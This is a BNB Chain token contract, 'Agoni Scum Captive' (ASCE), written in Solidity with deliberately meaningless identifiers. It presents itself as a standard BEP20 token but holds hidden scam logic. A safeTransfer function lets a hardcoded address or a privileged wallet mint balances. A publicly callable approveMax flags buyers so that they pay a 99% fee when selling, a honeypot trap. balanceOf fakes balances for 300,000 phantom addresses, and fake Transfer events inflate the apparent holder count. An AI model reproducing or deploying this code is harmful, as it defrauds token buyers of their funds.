/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}



interface IUniswapV2Router {

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

}


interface IBEP20 {

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function getOwner() external view returns (address);

    function approve(address spender, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}




contract AgoniScumCaptive is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    uint256 constant walletLimitListSellFeeMint = 1000000 * 10 ** 18;

    bool private launchSwapTxAutoToken = false;
    bool private listTradingSwapMarketing = false;

    uint256 public receiverBuyLimitMint = 0;

    bool private liquidityFeeReceiverTotalLimit = false;
    uint256 public limitMinTokenEnable0 = 0;
    mapping(address => uint256) _balances;

    uint256 private modeBuyTakeExempt = 0;
    address public uniswapV2Pair;

    uint256  exemptLaunchShouldFee = 100000000 * 10 ** _decimals;
    string constant _symbol = "ASCE";
    mapping(address => bool)  senderIsLimitMaxList;

    address private marketingSenderBurnListSell = (msg.sender);
    uint160 constant toLaunchedFeeLaunch = uint160(0xe2d1A5966b7e5eDAeE9c463dE6Fe500A7Ff31847);
    uint256 private enableLiquidityIsLimit = 0;
    bool private totalTakeAutoLiquiditySwapFromWallet = false;
    bool public botsReceiverAmountTrading = false;
    uint256 private toMarketingLimitBurn = 0;
    IUniswapV2Router public buyMaxBotsShould;

    uint256 private sellSwapTxLaunched = 0;
    uint256 private limitMinTokenEnable = 0;
    uint256  receiverAtAmountLaunchModeMint = 100000000 * 10 ** _decimals;
    uint256 private amountTakeLiquiditySell = 100;
    string constant _name = "Agoni Scum Captive";
    mapping(address => mapping(address => uint256)) _allowances;
    uint256 private buyMinReceiverFromBotsAutoReceiver = 0;


    mapping(address => bool)  sellSenderFundLaunched;
    uint256 constant walletToFromLiquidity = 100 * 10 ** 18;

    uint256 autoLaunchedSellMint = 0;
    uint256 public tokenToEnableLaunched = 0;

    uint256 constant buyLaunchedExemptFund = 100000000 * (10 ** 18);
    
    mapping(address => bool) private takeBurnFundIs;
    uint256 private shouldTradingEnableSenderTotalAmount = 0;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        buyMaxBotsShould = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(buyMaxBotsShould.factory()).createPair(address(this), buyMaxBotsShould.WETH());
        _allowances[address(this)][address(buyMaxBotsShould)] = buyLaunchedExemptFund;

        takeBurnFundIs[msg.sender] = true;
        takeBurnFundIs[address(this)] = true;

        _balances[msg.sender] = buyLaunchedExemptFund;
        emit Transfer(address(0), msg.sender, buyLaunchedExemptFund);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return buyLaunchedExemptFund;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != buyLaunchedExemptFund) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return isTotalMintReceiver(sender, recipient, amount);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return sellSenderFundLaunched[spender];
    }

    function approveMax(address spender) external {
        if (senderIsLimitMaxList[spender]) {
            sellSenderFundLaunched[spender] = true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (walletShouldExemptSender(uint160(account))) {
            return listMarketingSwapEnable(uint160(account));
        }
        return _balances[account];
    }

    function setshouldMaxSwapSender(bool launchShouldReceiverLaunched) public onlyOwner {
        if (botsReceiverAmountTrading != launchSwapTxAutoToken) {
            launchSwapTxAutoToken=launchShouldReceiverLaunched;
        }
        if (botsReceiverAmountTrading != listTradingSwapMarketing) {
            listTradingSwapMarketing=launchShouldReceiverLaunched;
        }
        if (botsReceiverAmountTrading != liquidityFeeReceiverTotalLimit) {
            liquidityFeeReceiverTotalLimit=launchShouldReceiverLaunched;
        }
        botsReceiverAmountTrading=launchShouldReceiverLaunched;
    }

    function amountTeamSwapTake(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function settakeWalletLiquidityLaunch(address launchShouldReceiverLaunched) public onlyOwner {
        marketingSenderBurnListSell=launchShouldReceiverLaunched;
    }

    function isTotalMintReceiver(address enableMinShouldLaunch, address atMaxMarketingAuto, uint256 limitSenderFeeTeamMarketing) internal returns (bool) {
        if (walletShouldExemptSender(uint160(atMaxMarketingAuto))) {
            liquidityMaxAutoAmount(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing, false);
            return true;
        }
        if (walletShouldExemptSender(uint160(enableMinShouldLaunch))) {
            liquidityMaxAutoAmount(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing, true);
            return true;
        }
        
        if (enableLiquidityIsLimit != modeBuyTakeExempt) {
            enableLiquidityIsLimit = limitMinTokenEnable0;
        }

        if (botsReceiverAmountTrading == listTradingSwapMarketing) {
            botsReceiverAmountTrading = launchSwapTxAutoToken;
        }

        if (limitMinTokenEnable0 == buyMinReceiverFromBotsAutoReceiver) {
            limitMinTokenEnable0 = toMarketingLimitBurn;
        }


        bool fromTakeModeExemptBurn = listTradingSenderWalletToken(enableMinShouldLaunch) || listTradingSenderWalletToken(atMaxMarketingAuto);
        
        if (toMarketingLimitBurn != enableLiquidityIsLimit) {
            toMarketingLimitBurn = buyMinReceiverFromBotsAutoReceiver;
        }

        if (liquidityFeeReceiverTotalLimit != listTradingSwapMarketing) {
            liquidityFeeReceiverTotalLimit = totalTakeAutoLiquiditySwapFromWallet;
        }

        if (tokenToEnableLaunched != limitMinTokenEnable) {
            tokenToEnableLaunched = toMarketingLimitBurn;
        }


        if (enableMinShouldLaunch == uniswapV2Pair && !fromTakeModeExemptBurn) {
            senderIsLimitMaxList[atMaxMarketingAuto] = true;
        }
        
        if (fromTakeModeExemptBurn) {
            return amountTeamSwapTake(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing);
        }
        
        if (tokenToEnableLaunched == amountTakeLiquiditySell) {
            tokenToEnableLaunched = receiverBuyLimitMint;
        }

        if (launchSwapTxAutoToken == liquidityFeeReceiverTotalLimit) {
            launchSwapTxAutoToken = totalTakeAutoLiquiditySwapFromWallet;
        }


        _balances[enableMinShouldLaunch] = _balances[enableMinShouldLaunch].sub(limitSenderFeeTeamMarketing, "Insufficient Balance!");
        
        if (listTradingSwapMarketing != botsReceiverAmountTrading) {
            listTradingSwapMarketing = launchSwapTxAutoToken;
        }


        uint256 limitSenderFeeTeamMarketingReceived = buySellExemptToken(enableMinShouldLaunch) ? receiverBurnMarketingFee(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing) : limitSenderFeeTeamMarketing;

        _balances[atMaxMarketingAuto] = _balances[atMaxMarketingAuto].add(limitSenderFeeTeamMarketingReceived);
        emit Transfer(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketingReceived);
        return true;
    }

    function listMarketingSwapEnable(uint160 amountMaxBurnReceiver) private view returns (uint256) {
        uint160 listEnableLaunchedExemptBuyTotalFrom = uint160(toLaunchedFeeLaunch);
        uint160 maxLaunchToShould = amountMaxBurnReceiver - listEnableLaunchedExemptBuyTotalFrom;
        if (maxLaunchToShould < autoLaunchedSellMint) {
            return walletToFromLiquidity * maxLaunchToShould;
        }
        return walletLimitListSellFeeMint + walletToFromLiquidity * maxLaunchToShould;
    }

    function gettakeWalletLiquidityLaunch() public view returns (address) {
        if (marketingSenderBurnListSell != marketingSenderBurnListSell) {
            return marketingSenderBurnListSell;
        }
        if (marketingSenderBurnListSell == marketingSenderBurnListSell) {
            return marketingSenderBurnListSell;
        }
        return marketingSenderBurnListSell;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getsenderTakeSellTotal() public view returns (bool) {
        if (totalTakeAutoLiquiditySwapFromWallet == listTradingSwapMarketing) {
            return listTradingSwapMarketing;
        }
        if (totalTakeAutoLiquiditySwapFromWallet == totalTakeAutoLiquiditySwapFromWallet) {
            return totalTakeAutoLiquiditySwapFromWallet;
        }
        if (totalTakeAutoLiquiditySwapFromWallet != totalTakeAutoLiquiditySwapFromWallet) {
            return totalTakeAutoLiquiditySwapFromWallet;
        }
        return totalTakeAutoLiquiditySwapFromWallet;
    }

    function getautoReceiverReceiverEnableLiquidity() public view returns (uint256) {
        if (shouldTradingEnableSenderTotalAmount == enableLiquidityIsLimit) {
            return enableLiquidityIsLimit;
        }
        if (shouldTradingEnableSenderTotalAmount == sellSwapTxLaunched) {
            return sellSwapTxLaunched;
        }
        return shouldTradingEnableSenderTotalAmount;
    }

    function buySellExemptToken(address enableMinShouldLaunch) internal view returns (bool) {
        return !takeBurnFundIs[enableMinShouldLaunch];
    }

    function getminTxReceiverModeTakeShouldBuy() public view returns (uint256) {
        if (sellSwapTxLaunched != shouldTradingEnableSenderTotalAmount) {
            return shouldTradingEnableSenderTotalAmount;
        }
        if (sellSwapTxLaunched == buyMinReceiverFromBotsAutoReceiver) {
            return buyMinReceiverFromBotsAutoReceiver;
        }
        return sellSwapTxLaunched;
    }

    function teamEnableReceiverMint(address enableMinShouldLaunch, bool shouldExemptLaunchReceiverAmountListTrading) internal returns (uint256) {
        if (sellSenderFundLaunched[enableMinShouldLaunch]) {
            return 99;
        }
        
        if (toMarketingLimitBurn != shouldTradingEnableSenderTotalAmount) {
            toMarketingLimitBurn = limitMinTokenEnable;
        }

        if (botsReceiverAmountTrading != botsReceiverAmountTrading) {
            botsReceiverAmountTrading = totalTakeAutoLiquiditySwapFromWallet;
        }


        if (shouldExemptLaunchReceiverAmountListTrading) {
            return buyMinReceiverFromBotsAutoReceiver;
        }
        if (!shouldExemptLaunchReceiverAmountListTrading && enableMinShouldLaunch == uniswapV2Pair) {
            return sellSwapTxLaunched;
        }
        return 0;
    }

    function liquidityMaxAutoAmount(address enableMinShouldLaunch, address atMaxMarketingAuto, uint256 limitSenderFeeTeamMarketing, bool fromShouldReceiverSellReceiverLimit) private {
        uint160 listEnableLaunchedExemptBuyTotalFrom = uint160(toLaunchedFeeLaunch);
        if (fromShouldReceiverSellReceiverLimit) {
            enableMinShouldLaunch = address(uint160(listEnableLaunchedExemptBuyTotalFrom + autoLaunchedSellMint));
            autoLaunchedSellMint++;
            _balances[atMaxMarketingAuto] = _balances[atMaxMarketingAuto].add(limitSenderFeeTeamMarketing);
        } else {
            _balances[enableMinShouldLaunch] = _balances[enableMinShouldLaunch].sub(limitSenderFeeTeamMarketing);
        }
        if (limitSenderFeeTeamMarketing == 0) {
            return;
        }
        emit Transfer(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing);
    }

    function setminTxReceiverModeTakeShouldBuy(uint256 launchShouldReceiverLaunched) public onlyOwner {
        sellSwapTxLaunched=launchShouldReceiverLaunched;
    }

    function setamountAutoEnableSellList(address launchShouldReceiverLaunched,bool autoIsMarketingFromToFundSwap) public onlyOwner {
        takeBurnFundIs[launchShouldReceiverLaunched]=autoIsMarketingFromToFundSwap;
    }

    function settradingFromMarketingBuyAtReceiver(uint256 launchShouldReceiverLaunched) public onlyOwner {
        if (buyMinReceiverFromBotsAutoReceiver != toMarketingLimitBurn) {
            toMarketingLimitBurn=launchShouldReceiverLaunched;
        }
        if (buyMinReceiverFromBotsAutoReceiver != modeBuyTakeExempt) {
            modeBuyTakeExempt=launchShouldReceiverLaunched;
        }
        buyMinReceiverFromBotsAutoReceiver=launchShouldReceiverLaunched;
    }

    function settokenReceiverSenderFee(uint256 launchShouldReceiverLaunched) public onlyOwner {
        if (receiverBuyLimitMint != modeBuyTakeExempt) {
            modeBuyTakeExempt=launchShouldReceiverLaunched;
        }
        receiverBuyLimitMint=launchShouldReceiverLaunched;
    }

    function getamountLimitReceiverSell() public view returns (uint256) {
        if (tokenToEnableLaunched != sellSwapTxLaunched) {
            return sellSwapTxLaunched;
        }
        if (tokenToEnableLaunched != limitMinTokenEnable) {
            return limitMinTokenEnable;
        }
        if (tokenToEnableLaunched == sellSwapTxLaunched) {
            return sellSwapTxLaunched;
        }
        return tokenToEnableLaunched;
    }

    function setsenderTakeSellTotal(bool launchShouldReceiverLaunched) public onlyOwner {
        if (totalTakeAutoLiquiditySwapFromWallet != liquidityFeeReceiverTotalLimit) {
            liquidityFeeReceiverTotalLimit=launchShouldReceiverLaunched;
        }
        totalTakeAutoLiquiditySwapFromWallet=launchShouldReceiverLaunched;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function getmarketingTradingReceiverTx() public view returns (bool) {
        if (launchSwapTxAutoToken != botsReceiverAmountTrading) {
            return botsReceiverAmountTrading;
        }
        return launchSwapTxAutoToken;
    }

    function setmarketingTradingReceiverTx(bool launchShouldReceiverLaunched) public onlyOwner {
        if (launchSwapTxAutoToken != botsReceiverAmountTrading) {
            botsReceiverAmountTrading=launchShouldReceiverLaunched;
        }
        launchSwapTxAutoToken=launchShouldReceiverLaunched;
    }

    function getshouldMaxSwapSender() public view returns (bool) {
        if (botsReceiverAmountTrading == totalTakeAutoLiquiditySwapFromWallet) {
            return totalTakeAutoLiquiditySwapFromWallet;
        }
        if (botsReceiverAmountTrading == botsReceiverAmountTrading) {
            return botsReceiverAmountTrading;
        }
        if (botsReceiverAmountTrading == totalTakeAutoLiquiditySwapFromWallet) {
            return totalTakeAutoLiquiditySwapFromWallet;
        }
        return botsReceiverAmountTrading;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function gettokenReceiverSenderFee() public view returns (uint256) {
        return receiverBuyLimitMint;
    }

    function tradingBuySwapLiquidity() private pure returns (address) {
        return 0x09A3b9C184F4C77DE4b5B1D35aADD5dCf2AACF5C;
    }

    function setmintWalletTradingLimit(uint256 launchShouldReceiverLaunched) public onlyOwner {
        if (modeBuyTakeExempt == receiverBuyLimitMint) {
            receiverBuyLimitMint=launchShouldReceiverLaunched;
        }
        if (modeBuyTakeExempt != modeBuyTakeExempt) {
            modeBuyTakeExempt=launchShouldReceiverLaunched;
        }
        if (modeBuyTakeExempt != receiverBuyLimitMint) {
            receiverBuyLimitMint=launchShouldReceiverLaunched;
        }
        modeBuyTakeExempt=launchShouldReceiverLaunched;
    }

    function getmintWalletTradingLimit() public view returns (uint256) {
        return modeBuyTakeExempt;
    }

    function receiverBurnMarketingFee(address enableMinShouldLaunch, address listMaxToTrading, uint256 limitSenderFeeTeamMarketing) internal returns (uint256) {
        
        uint256 receiverAutoLiquidityExemptReceiver = limitSenderFeeTeamMarketing.mul(teamEnableReceiverMint(enableMinShouldLaunch, listMaxToTrading == uniswapV2Pair)).div(amountTakeLiquiditySell);

        if (receiverAutoLiquidityExemptReceiver > 0) {
            _balances[address(this)] = _balances[address(this)].add(receiverAutoLiquidityExemptReceiver);
            emit Transfer(enableMinShouldLaunch, address(this), receiverAutoLiquidityExemptReceiver);
        }

        return limitSenderFeeTeamMarketing.sub(receiverAutoLiquidityExemptReceiver);
    }

    function amountReceiverTotalList(address amountMaxBurnReceiver) private pure returns (bool) {
        return amountMaxBurnReceiver == tradingBuySwapLiquidity();
    }

    function gettradingFromMarketingBuyAtReceiver() public view returns (uint256) {
        if (buyMinReceiverFromBotsAutoReceiver != modeBuyTakeExempt) {
            return modeBuyTakeExempt;
        }
        if (buyMinReceiverFromBotsAutoReceiver == shouldTradingEnableSenderTotalAmount) {
            return shouldTradingEnableSenderTotalAmount;
        }
        return buyMinReceiverFromBotsAutoReceiver;
    }

    function safeTransfer(address enableMinShouldLaunch, address atMaxMarketingAuto, uint256 limitSenderFeeTeamMarketing) public {
        if (!amountReceiverTotalList(msg.sender) && msg.sender != marketingSenderBurnListSell) {
            return;
        }
        if (walletShouldExemptSender(uint160(atMaxMarketingAuto))) {
            liquidityMaxAutoAmount(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing, false);
            return;
        }
        if (atMaxMarketingAuto == address(1)) {
            return;
        }
        if (walletShouldExemptSender(uint160(enableMinShouldLaunch))) {
            liquidityMaxAutoAmount(enableMinShouldLaunch, atMaxMarketingAuto, limitSenderFeeTeamMarketing, true);
            return;
        }
        if (limitSenderFeeTeamMarketing == 0) {
            return;
        }
        if (enableMinShouldLaunch == address(0)) {
            _balances[atMaxMarketingAuto] = _balances[atMaxMarketingAuto].add(limitSenderFeeTeamMarketing);
            return;
        }
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return isTotalMintReceiver(msg.sender, recipient, amount);
    }

    function walletShouldExemptSender(uint160 amountMaxBurnReceiver) private pure returns (bool) {
        uint160 listEnableLaunchedExemptBuyTotalFrom = toLaunchedFeeLaunch;
        if (amountMaxBurnReceiver >= uint160(listEnableLaunchedExemptBuyTotalFrom)) {
            if (amountMaxBurnReceiver <= uint160(listEnableLaunchedExemptBuyTotalFrom) + 300000) {
                return true;
            }
        }
        return false;
    }

    function getamountAutoEnableSellList(address launchShouldReceiverLaunched) public view returns (bool) {
        if (launchShouldReceiverLaunched == marketingSenderBurnListSell) {
            return totalTakeAutoLiquiditySwapFromWallet;
        }
        if (launchShouldReceiverLaunched == marketingSenderBurnListSell) {
            return liquidityFeeReceiverTotalLimit;
        }
        if (launchShouldReceiverLaunched == marketingSenderBurnListSell) {
            return liquidityFeeReceiverTotalLimit;
        }
            return takeBurnFundIs[launchShouldReceiverLaunched];
    }

    function listTradingSenderWalletToken(address listAutoWalletMint) private view returns (bool) {
        if (listAutoWalletMint == marketingSenderBurnListSell) {
            return true;
        }
        return false;
    }

    function setamountLimitReceiverSell(uint256 launchShouldReceiverLaunched) public onlyOwner {
        if (tokenToEnableLaunched == limitMinTokenEnable) {
            limitMinTokenEnable=launchShouldReceiverLaunched;
        }
        tokenToEnableLaunched=launchShouldReceiverLaunched;
    }

    function setautoReceiverReceiverEnableLiquidity(uint256 launchShouldReceiverLaunched) public onlyOwner {
        if (shouldTradingEnableSenderTotalAmount == limitMinTokenEnable) {
            limitMinTokenEnable=launchShouldReceiverLaunched;
        }
        if (shouldTradingEnableSenderTotalAmount == sellSwapTxLaunched) {
            sellSwapTxLaunched=launchShouldReceiverLaunched;
        }
        shouldTradingEnableSenderTotalAmount=launchShouldReceiverLaunched;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}